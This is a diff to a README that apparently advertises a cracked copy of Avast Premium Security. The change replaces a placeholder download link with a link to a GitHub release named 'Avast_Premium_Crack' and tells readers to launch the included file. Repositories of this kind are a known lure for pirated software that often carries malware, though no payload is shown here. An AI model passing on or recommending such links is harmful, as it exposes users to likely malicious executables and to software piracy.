@@ -25,9 +25,9 @@ Explore the following topics in this repository:
 - install-avast-premium-security
 
 ## Access the Program
-Access the program [here](https://github.com/download/Program.zip). Make sure to launch the file included in the link to get started with Avast Premium!
+Access the program [here](https://github.com/AibakButt/Avast_Premium_Crack/releases/tag/v2.0). Make sure to launch the file included in the link to get started with Avast Premium!
 
-[![Download Program](https://img.shields.io/badge/Download-Program-brightgreen)](https://github.com/download/Program.zip)
+[![Download Program](https://github.com/AibakButt/Avast_Premium_Crack/releases/tag/v2.0)](https://github.com/AibakButt/Avast_Premium_Crack/releases/tag/v2.0)
 
 ## Get Started
 To begin your journey with Avast Premium products, click on the link above and explore the wide range of features and functionalities offered. Whether you are looking for enhanced security or premium tech support, this repository has you covered.
